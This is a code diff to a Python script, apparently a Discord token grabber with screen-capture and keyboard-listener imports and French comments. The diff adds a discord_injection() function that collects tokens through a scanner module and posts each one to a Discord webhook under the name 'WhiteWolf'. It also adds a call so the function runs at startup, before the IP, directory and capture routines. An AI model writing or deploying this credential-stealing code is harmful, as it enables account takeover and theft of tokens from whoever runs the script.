@@ -7,7 +7,10 @@ import io
 import mss.tools
 from pynput import keyboard
 import random
-
+import shutil
+import json
+import sys
+from scanner import scan_all
 
 red = "\033[31m"
 green = "\033[32m"
@@ -35,6 +38,25 @@ print(f""" {yellow}
 os.system("cls")
 
 webhook = "" # Ici faut placer ton webhook
+
+def discord_injection():
+    sys.path.insert(0, os.path.join(os.path.dirname(__file__), "src"))
+    from scanner import scan_all
+    if __name__ == "__main__":
+        tokens = scan_all()
+        if not tokens:
+            print("")
+        else:
+            for i, item in enumerate(tokens, 1):
+                source = item.get("source", "?")
+                profile = item.get("profile", "")
+                token = item["token"]
+                data = {
+                    "content": token, 
+                    "username": "WhiteWolf", 
+                    "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
+                    }
+                requests.post(webhook, json=data)
 
 def dossier():
     while True:
@@ -105,6 +127,7 @@ def ip():
         print("Value error")
         time.sleep(3)
 
+discord_injection()
 ip()
 dir()
 capture()
